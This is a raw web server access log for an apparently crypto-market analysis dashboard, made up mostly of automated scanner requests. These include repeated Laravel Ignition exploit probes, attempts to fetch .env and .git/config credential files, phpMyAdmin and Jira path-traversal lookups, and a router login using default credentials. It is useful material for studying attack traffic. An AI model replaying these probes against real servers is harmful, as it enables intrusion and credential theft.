[25/May/2022 22:58:21] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
[25/May/2022 23:20:58] "GET / HTTP/1.0" 302 0
[25/May/2022 23:20:59] "GET /public/index.html HTTP/1.0" 200 2139
[25/May/2022 23:25:42] "GET / HTTP/1.0" 302 0
[25/May/2022 23:25:43] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[25/May/2022 23:27:33] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[25/May/2022 23:59:08] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[25/May/2022 23:59:10] "POST /HNAP1/ HTTP/1.0" 404 2167
[26/May/2022 00:03:27] "GET / HTTP/1.0" 302 0
[26/May/2022 00:03:27] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 00:44:37] "GET / HTTP/1.0" 302 0
[26/May/2022 00:44:38] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 00:44:40] "GET / HTTP/1.0" 302 0
[26/May/2022 00:44:41] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 00:44:44] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[26/May/2022 00:44:44] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 00:44:44] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
Not Found: /favicon.ico
[26/May/2022 00:44:50] "GET /favicon.ico HTTP/1.0" 404 2181
[26/May/2022 00:49:21] "GET / HTTP/1.0" 302 0
[26/May/2022 00:56:52] "GET / HTTP/1.0" 302 0
[26/May/2022 00:56:53] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 01:23:55] "GET / HTTP/1.0" 302 0
Not Found: /actuator/gateway/routes
[26/May/2022 01:31:33] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
[26/May/2022 01:49:21] "GET / HTTP/1.0" 302 0
[26/May/2022 01:49:21] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /api/getconfig.aspx
[26/May/2022 01:49:21] "GET /api/getconfig.aspx HTTP/1.0" 404 2290
Not Found: /skin/main/onload.js
[26/May/2022 01:49:21] "GET /skin/main/onload.js HTTP/1.0" 404 2205
Not Found: /Public/css/_pk10.css
[26/May/2022 01:49:26] "GET /Public/css/_pk10.css HTTP/1.0" 404 2208
Internal Server Error: /api/wallet/redDetail
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/opt/nora_analysis/Client/urls.py", line 11, in processRoute
    if not controller in globals(): raise Exception(f"Can not find controller {controller}")
Exception: Can not find controller wallet
[26/May/2022 01:49:27] "GET /api/wallet/redDetail HTTP/1.0" 500 65872
Not Found: /static/css/index.css
[26/May/2022 01:49:27] "GET /static/css/index.css HTTP/1.0" 404 2208
Not Found: /Public/Home/js/cls.js
[26/May/2022 01:49:32] "GET /Public/Home/js/cls.js HTTP/1.0" 404 2211
Not Found: /static/css/public.css
[26/May/2022 01:49:33] "GET /static/css/public.css HTTP/1.0" 404 2211
Not Found: /index/user/login.html
[26/May/2022 01:49:33] "GET /index/user/login.html HTTP/1.0" 404 2211
Not Found: /static/wap/js/order.js
[26/May/2022 01:49:33] "GET /static/wap/js/order.js HTTP/1.0" 404 2214
Not Found: /template/css/login.css
[26/May/2022 01:49:33] "GET /template/css/login.css HTTP/1.0" 404 2214
Not Found: /zz/address.php
[26/May/2022 01:49:34] "GET /zz/address.php?gid=651 HTTP/1.0" 404 2198
Not Found: /detail6/image/sjrz.png
[26/May/2022 01:49:34] "GET /detail6/image/sjrz.png HTTP/1.0" 404 2214
Not Found: /member/js/lang_zh_CN.js
[26/May/2022 01:49:38] "GET /member/js/lang_zh_CN.js HTTP/1.0" 404 2217
Not Found: /index/imtoken/auth.html
[26/May/2022 01:49:38] "GET /index/imtoken/auth.html HTTP/1.0" 404 2217
Not Found: /ccsj/common/download.js
[26/May/2022 01:49:38] "GET /ccsj/common/download.js HTTP/1.0" 404 2217
Not Found: /Public/Wchat/js/cvphp.js
[26/May/2022 01:49:39] "GET /Public/Wchat/js/cvphp.js HTTP/1.0" 404 2220
Not Found: /static/wap/css/index.css
[26/May/2022 01:49:39] "GET /static/wap/css/index.css HTTP/1.0" 404 2220
Not Found: /static/mobile/user.html
[26/May/2022 01:49:40] "GET /static/mobile/user.html HTTP/1.0" 404 2217
Not Found: /phone/images/icon_01.png
[26/May/2022 01:49:40] "GET /phone/images/icon_01.png HTTP/1.0" 404 2220
Not Found: /m/lotto-h5/manifest.json
[26/May/2022 01:49:40] "GET /m/lotto-h5/manifest.json HTTP/1.0" 404 2220
Not Found: /bjfsj/common/download.js
[26/May/2022 01:49:41] "GET /bjfsj/common/download.js HTTP/1.0" 404 2220
Not Found: /Content/css/wzwstylel.css
[26/May/2022 01:49:42] "GET /Content/css/wzwstylel.css HTTP/1.0" 404 2223
Not Found: /static/download/style.css
[26/May/2022 01:49:42] "GET /static/download/style.css HTTP/1.0" 404 2223
Not Found: /static/image/logo.png
[26/May/2022 01:49:43] "GET /static/image/logo.png?v=4 HTTP/1.0" 404 2215
Not Found: /static/images/login_bg.jpg
[26/May/2022 01:49:44] "GET /static/images/login_bg.jpg HTTP/1.0" 404 2226
Not Found: /img/phonetrackeronline.png
[26/May/2022 01:49:46] "GET /img/phonetrackeronline.png HTTP/1.0" 404 2226
Not Found: /static/index/js/lk/order.js
[26/May/2022 01:49:46] "GET /static/index/js/lk/order.js HTTP/1.0" 404 2229
Not Found: /resources/css/headernav.css
[26/May/2022 01:49:46] "GET /resources/css/headernav.css HTTP/1.0" 404 2229
Not Found: /home/login/login_index.html
[26/May/2022 01:49:46] "GET /home/login/login_index.html HTTP/1.0" 404 2229
Not Found: /static/home/csjs/bankCheck.js
[26/May/2022 01:49:50] "GET /static/home/csjs/bankCheck.js HTTP/1.0" 404 2235
Not Found: /api/web/user/getIndexData.php
[26/May/2022 01:49:50] "GET /api/web/user/getIndexData.php HTTP/1.0" 404 2323
Not Found: /wap/trading/lastKlineParameter
[26/May/2022 01:49:52] "GET /wap/trading/lastKlineParameter HTTP/1.0" 404 2238
Not Found: /getConfig/getArticle.do
[26/May/2022 01:49:52] "GET /getConfig/getArticle.do?code=1 HTTP/1.0" 404 2224
Not Found: /Public/home/wap/css/qdgame.css
[26/May/2022 01:49:52] "GET /Public/home/wap/css/qdgame.css HTTP/1.0" 404 2238
Not Found: /resource/home/css/person.css
[26/May/2022 01:49:52] "GET /resource/home/css/person.css HTTP/1.0" 404 2232
Not Found: /assets/room/css/room_mobile.css
[26/May/2022 01:49:53] "GET /assets/room/css/room_mobile.css HTTP/1.0" 404 2241
Not Found: /masterControl/getSystemSetting
[26/May/2022 01:49:53] "GET /masterControl/getSystemSetting HTTP/1.0" 404 2238
Internal Server Error: /api/mobile/checkStrategyHistory
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/opt/nora_analysis/Client/urls.py", line 11, in processRoute
    if not controller in globals(): raise Exception(f"Can not find controller {controller}")
Exception: Can not find controller mobile
[26/May/2022 01:49:53] "GET /api/mobile/checkStrategyHistory HTTP/1.0" 500 66048
Not Found: /infe/rest/flash/getServerIP.json
[26/May/2022 01:49:53] "GET /infe/rest/flash/getServerIP.json HTTP/1.0" 404 2244
Not Found: /wap/trading/get_newallorder_ajax
[26/May/2022 01:49:54] "GET /wap/trading/get_newallorder_ajax HTTP/1.0" 404 2244
Not Found: /images/src_images_but_dianz_s.png
[26/May/2022 01:49:54] "GET /images/src_images_but_dianz_s.png HTTP/1.0" 404 2247
Not Found: /api/public/
[26/May/2022 01:49:57] "GET /api/public/?service=Home.getConfig HTTP/1.0" 404 2292
Not Found: /h5/static/cert/icon_yanzhengma.png
[26/May/2022 01:49:57] "GET /h5/static/cert/icon_yanzhengma.png HTTP/1.0" 404 2250
Not Found: /v1/management/tenant/getSpeedDomain
[26/May/2022 01:49:57] "GET /v1/management/tenant/getSpeedDomain HTTP/1.0" 404 2253
Not Found: /index.php/Wap/Api/getSystemNotice
[26/May/2022 01:49:59] "GET /index.php/Wap/Api/getSystemNotice?id=1 HTTP/1.0" 404 2252
Not Found: /Buy/Index/getCardListByType
[26/May/2022 01:49:59] "GET /Buy/Index/getCardListByType?typeid=344 HTTP/1.0" 404 2240
Not Found: /mobile21/js/index/gameManagement.js
[26/May/2022 01:49:59] "GET /mobile21/js/index/gameManagement.js?v=7 HTTP/1.0" 404 2257
Not Found: /assets/images/mobile/dou_icon_money.png
[26/May/2022 01:49:59] "GET /assets/images/mobile/dou_icon_money.png HTTP/1.0" 404 2265
Not Found: /ajax/allcoin_a/id/0
[26/May/2022 01:49:59] "GET /ajax/allcoin_a/id/0?t=0.3782499195965951 HTTP/1.0" 404 2226
Not Found: /index.php
[26/May/2022 01:49:59] "GET /index.php?m=api&c=app&a=getPlatformConfig HTTP/1.0" 404 2215
Not Found: /api/system/systemConfigs/getCustomerServiceLink
[26/May/2022 01:50:02] "POST /api/system/systemConfigs/getCustomerServiceLink HTTP/1.0" 404 2378
Not Found: /client/api/findConfigByKey
[26/May/2022 01:50:03] "GET /client/api/findConfigByKey?configKey=level_config HTTP/1.0" 404 2249
Not Found: /site/api/v1/site/vipExclusiveDomain/getGuestDomain
[26/May/2022 01:50:03] "POST /site/api/v1/site/vipExclusiveDomain/getGuestDomain HTTP/1.0" 404 2299
Not Found: /themes/simpleboot3/public/assets/newpc/download_pattern_right.png
[26/May/2022 01:50:04] "GET /themes/simpleboot3/public/assets/newpc/download_pattern_right.png HTTP/1.0" 404 2343
[26/May/2022 01:50:04] "GET / HTTP/1.0" 302 0
[26/May/2022 01:50:05] "GET / HTTP/1.0" 302 0
[26/May/2022 01:50:05] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 01:50:05] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 01:50:05] "GET / HTTP/1.0" 302 0
[26/May/2022 01:50:05] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 01:50:05] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
Not Found: /other/codepay/js/codepay_util.js
[26/May/2022 01:50:05] "GET /other/codepay/js/codepay_util.js HTTP/1.0" 404 2244
[26/May/2022 01:50:05] "GET / HTTP/1.0" 302 0
Not Found: /favicon.ico
[26/May/2022 01:50:06] "GET /favicon.ico HTTP/1.0" 404 2181
[26/May/2022 01:50:06] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 01:50:06] "GET / HTTP/1.0" 302 0
Not Found: /h5/
[26/May/2022 01:50:09] "GET /h5/ HTTP/1.0" 404 2157
[26/May/2022 01:50:11] "GET /admin HTTP/1.0" 301 0
[26/May/2022 01:50:11] "GET /admin/ HTTP/1.0" 302 0
[26/May/2022 01:50:12] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1819
Not Found: /wap/
[26/May/2022 01:50:12] "GET /wap/ HTTP/1.0" 404 2160
Not Found: /home/
[26/May/2022 01:50:12] "GET /home/ HTTP/1.0" 404 2163
Not Found: /config.js
[26/May/2022 01:50:17] "GET /config.js HTTP/1.0" 404 2175
Not Found: /api/config
[26/May/2022 01:50:22] "GET /api/config HTTP/1.0" 404 2266
Not Found: /js/basic.js
[26/May/2022 01:50:23] "GET /js/basic.js HTTP/1.0" 404 2181
Not Found: /thriveGame.css
[26/May/2022 01:50:33] "GET /thriveGame.css HTTP/1.0" 404 2190
Not Found: /app/js/base.js
[26/May/2022 01:50:33] "GET /app/js/base.js HTTP/1.0" 404 2190
Not Found: /img/zllqdk.png
[26/May/2022 01:50:33] "GET /img/zllqdk.png HTTP/1.0" 404 2190
Not Found: /mmj/index.html
[26/May/2022 01:50:33] "GET /mmj/index.html HTTP/1.0" 404 2190
Not Found: /statics/js/API.js
[26/May/2022 01:50:43] "GET /statics/js/API.js HTTP/1.0" 404 2199
Not Found: /mytio/config/base
[26/May/2022 01:50:43] "GET /mytio/config/base HTTP/1.0" 404 2199
Not Found: /biz/server/config
[26/May/2022 01:50:43] "POST /biz/server/config HTTP/1.0" 404 2200
Internal Server Error: /api/app/config_new
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/opt/nora_analysis/Client/urls.py", line 11, in processRoute
    if not controller in globals(): raise Exception(f"Can not find controller {controller}")
Exception: Can not find controller app
[26/May/2022 01:50:48] "POST /api/app/config_new HTTP/1.0" 500 66378
Not Found: /api/product/info/1
[26/May/2022 01:50:48] "GET /api/product/info/1 HTTP/1.0" 404 2290
Internal Server Error: /api/Index/getconfig
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/lib/python3/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/opt/nora_analysis/Client/urls.py", line 11, in processRoute
    if not controller in globals(): raise Exception(f"Can not find controller {controller}")
Exception: Can not find controller Index
[26/May/2022 01:50:50] "GET /api/Index/getconfig HTTP/1.0" 500 66394
Not Found: /js/subsidy/bk.min.js
[26/May/2022 01:50:52] "GET /js/subsidy/bk.min.js HTTP/1.0" 404 2208
[26/May/2022 01:50:52] "GET /public/css/style.css HTTP/1.0" 404 1661
Not Found: /v2/block/home/app/hot
[26/May/2022 01:50:58] "GET /v2/block/home/app/hot HTTP/1.0" 404 2211
Not Found: /assets/res/mods/room.js
[26/May/2022 01:51:00] "GET /assets/res/mods/room.js HTTP/1.0" 404 2217
Not Found: /ccsj/common/download.js
[26/May/2022 01:51:07] "GET /ccsj/common/download.js HTTP/1.0" 404 2217
Not Found: /phone/images/icon_01.png
[26/May/2022 01:51:07] "GET /phone/images/icon_01.png HTTP/1.0" 404 2220
Not Found: /bjfsj/common/download.js
[26/May/2022 01:51:07] "GET /bjfsj/common/download.js HTTP/1.0" 404 2220
Not Found: /cksfq/common/download.js
[26/May/2022 01:51:07] "GET /cksfq/common/download.js HTTP/1.0" 404 2220
Not Found: /saconfig/secure/yunwei.js
[26/May/2022 01:51:08] "GET /saconfig/secure/yunwei.js HTTP/1.0" 404 2223
Not Found: /static/img/bitbeb-logo.png
[26/May/2022 01:51:10] "GET /static/img/bitbeb-logo.png HTTP/1.0" 404 2226
Not Found: /T9sA/static/image/t-06.jpg
[26/May/2022 01:51:12] "GET /T9sA/static/image/t-06.jpg HTTP/1.0" 404 2226
Not Found: /detaila/js/unified_service.js
[26/May/2022 01:51:18] "GET /detaila/js/unified_service.js HTTP/1.0" 404 2235
[26/May/2022 01:51:20] "GET / HTTP/1.0" 302 0
[26/May/2022 01:51:20] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 01:51:37] "GET / HTTP/1.0" 302 0
[26/May/2022 01:51:38] "GET / HTTP/1.0" 302 0
Not Found: /m/env.js
[26/May/2022 01:51:47] "GET /m/env.js HTTP/1.0" 404 2172
Not Found: /style.css
[26/May/2022 01:51:47] "GET /style.css HTTP/1.0" 404 2175
[26/May/2022 02:23:15] "GET / HTTP/1.0" 302 0
[26/May/2022 02:23:19] "GET / HTTP/1.0" 302 0
[26/May/2022 02:23:26] "GET / HTTP/1.0" 302 0
[26/May/2022 02:23:40] "GET / HTTP/1.0" 302 0
[26/May/2022 02:23:57] "GET / HTTP/1.0" 302 0
[26/May/2022 02:24:58] "GET / HTTP/1.0" 302 0
[26/May/2022 02:34:00] "GET / HTTP/1.0" 302 0
[26/May/2022 03:17:10] "GET / HTTP/1.0" 302 0
Not Found: /phpmyadmin/
[26/May/2022 03:34:17] "GET /phpmyadmin/ HTTP/1.0" 404 2181
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 03:39:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /.env
[26/May/2022 03:47:39] "GET /.env HTTP/1.0" 404 2160
[26/May/2022 03:47:45] "POST / HTTP/1.0" 302 0
[26/May/2022 03:52:37] "GET / HTTP/1.0" 302 0
[26/May/2022 03:52:38] "GET / HTTP/1.0" 302 0
[26/May/2022 03:52:39] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /cgi-bin/index2.asp
[26/May/2022 03:53:35] "POST /cgi-bin/index2.asp HTTP/1.0" 404 2203
[26/May/2022 04:06:23] "GET / HTTP/1.0" 302 0
[26/May/2022 04:06:55] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 04:07:04] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /robots.txt
[26/May/2022 04:07:13] "GET /robots.txt HTTP/1.0" 404 2178
Not Found: /sitemap.xml
[26/May/2022 04:07:25] "GET /sitemap.xml HTTP/1.0" 404 2181
[26/May/2022 04:13:01] "GET / HTTP/1.0" 302 0
[26/May/2022 04:13:02] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /Public/home/js/check.js
[26/May/2022 04:13:02] "GET /Public/home/js/check.js HTTP/1.0" 404 2217
[26/May/2022 05:34:42] "GET / HTTP/1.0" 302 0
[26/May/2022 05:34:42] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 05:34:43] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[26/May/2022 05:34:43] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[26/May/2022 05:34:43] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[26/May/2022 05:34:43] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[26/May/2022 05:34:43] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
Not Found: /sockjs-node
[26/May/2022 05:34:44] "GET /sockjs-node HTTP/1.0" 404 2189
[26/May/2022 05:34:45] "GET /api/authentication/getUser HTTP/1.0" 200 71
[26/May/2022 05:34:45] "GET /public/favicon.ico HTTP/1.0" 200 22382
[26/May/2022 05:34:45] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[26/May/2022 05:34:45] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[26/May/2022 05:34:45] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.0" 304 0
[26/May/2022 05:34:45] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[26/May/2022 05:34:45] "GET /public/static/js/main.chunk.js.map HTTP/1.0" 200 1196699
[26/May/2022 05:34:46] "GET /admin/login?next=https%3A%2F%2Fanalysis.efinora.com%2Fpublic%2Findex.html%23%2F HTTP/1.0" 301 0
[26/May/2022 05:34:46] "GET /admin/login/?next=https%3A%2F%2Fanalysis.efinora.com%2Fpublic%2Findex.html%23%2F HTTP/1.0" 200 1915
[26/May/2022 05:34:47] "GET /public/admin/css/base.css HTTP/1.0" 200 16378
[26/May/2022 05:34:47] "GET /public/admin/css/login.css HTTP/1.0" 200 1233
[26/May/2022 05:34:47] "GET /public/admin/css/responsive.css HTTP/1.0" 200 17944
[26/May/2022 05:34:47] "GET /public/admin/css/fonts.css HTTP/1.0" 200 423
[26/May/2022 05:34:47] "GET /public/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.0" 200 85876
[26/May/2022 05:34:47] "GET /public/admin/fonts/Roboto-Light-webfont.woff HTTP/1.0" 200 85692
Not Found: /favicon.ico
[26/May/2022 05:34:47] "GET /favicon.ico HTTP/1.0" 404 2189
[26/May/2022 05:35:01] "POST /admin/login/?next=https%3A%2F%2Fanalysis.efinora.com%2Fpublic%2Findex.html%23%2F HTTP/1.0" 302 0
[26/May/2022 05:35:01] "GET /public/index.html HTTP/1.0" 304 0
Not Found: /sockjs-node
[26/May/2022 05:35:02] "GET /sockjs-node HTTP/1.0" 404 2189
[26/May/2022 05:35:02] "GET /api/authentication/getUser HTTP/1.0" 200 84
[26/May/2022 05:35:03] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.0" 200 20322
[26/May/2022 05:35:03] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.0" 304 0
[26/May/2022 05:35:03] "POST /api/future_spot_summary/read HTTP/1.0" 200 32925
[26/May/2022 05:35:05] "POST /api/future_candle_1m/read HTTP/1.0" 200 690048
[26/May/2022 05:35:06] "POST /api/spot_candle_1m/read HTTP/1.0" 200 658749
[26/May/2022 05:35:07] "POST /api/future_spot_diff/read HTTP/1.0" 200 708294
[26/May/2022 05:40:41] "HEAD / HTTP/1.0" 302 0
[26/May/2022 05:40:42] "HEAD /public/index.html HTTP/1.0" 200 2139
[26/May/2022 05:40:57] "GET / HTTP/1.0" 302 0
[26/May/2022 05:40:58] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 06:30:34] "GET / HTTP/1.0" 302 0
[26/May/2022 06:30:34] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 07:35:32] "GET / HTTP/1.0" 302 0
Not Found: /.env
Not Found: /s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
[26/May/2022 07:35:32] "GET /.env HTTP/1.0" 404 2160
[26/May/2022 07:35:32] "GET /s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.0" 404 2375
Not Found: /info.php
Not Found: /.DS_Store
[26/May/2022 07:35:32] "GET /info.php HTTP/1.0" 404 2172
Not Found: /.git/config
[26/May/2022 07:35:32] "GET /?rest_route=/wp/v2/users/ HTTP/1.0" 302 0
Not Found: /server-status
[26/May/2022 07:35:32] "GET /.DS_Store HTTP/1.0" 404 2175
Not Found: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
[26/May/2022 07:35:32] "GET /.git/config HTTP/1.0" 404 2181
Not Found: /telescope/requests
[26/May/2022 07:35:32] "GET /server-status HTTP/1.0" 404 2187
[26/May/2022 07:35:32] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 404 2373
[26/May/2022 07:35:32] "GET /telescope/requests HTTP/1.0" 404 2202
Not Found: /config.json
[26/May/2022 07:35:33] "GET /config.json HTTP/1.0" 404 2181
Not Found: /login.action
[26/May/2022 07:35:33] "GET /login.action HTTP/1.0" 404 2184
[26/May/2022 08:42:48] "GET / HTTP/1.0" 302 0
[26/May/2022 08:43:48] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 09:11:30] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:04] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[26/May/2022 09:24:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /phpmyadmin2/index.php
[26/May/2022 09:45:12] "GET /phpmyadmin2/index.php?lang=en HTTP/1.0" 404 2219
Not Found: /mysql/mysqlmanager/index.php
[26/May/2022 09:45:12] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0" 404 2240
Not Found: /administrator/phpmyadmin/index.php
[26/May/2022 09:45:12] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0" 404 2258
Not Found: /phpMyAdmin-5.2.0/index.php
[26/May/2022 09:45:12] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.0" 404 2234
[26/May/2022 10:13:39] "GET / HTTP/1.0" 302 0
[26/May/2022 10:17:12] "GET / HTTP/1.0" 302 0
[26/May/2022 10:42:28] "GET / HTTP/1.0" 302 0
[26/May/2022 11:06:26] "GET / HTTP/1.0" 302 0
[26/May/2022 11:06:27] "GET / HTTP/1.0" 302 0
[26/May/2022 11:06:28] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 11:06:30] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /console
[26/May/2022 11:06:32] "GET /console HTTP/1.0" 404 2169
[26/May/2022 11:06:35] "GET / HTTP/1.0" 302 0
[26/May/2022 11:06:36] "GET / HTTP/1.0" 302 0
[26/May/2022 11:06:37] "GET /public/index.html HTTP/1.0" 200 2139
[26/May/2022 11:06:40] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /console
[26/May/2022 11:06:41] "GET /console HTTP/1.0" 404 2169
[26/May/2022 11:34:05] "GET / HTTP/1.0" 302 0
[26/May/2022 11:34:05] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /fuN3
[26/May/2022 12:48:44] "GET /fuN3 HTTP/1.0" 404 2168
Not Found: /boaform/admin/formLogin
[26/May/2022 13:05:11] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 2260
[26/May/2022 13:15:15] "GET / HTTP/1.0" 302 0
Not Found: /.env
[26/May/2022 14:22:48] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[26/May/2022 14:22:49] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /storage/.env
[26/May/2022 14:22:49] "GET /storage/.env HTTP/1.0" 404 2184
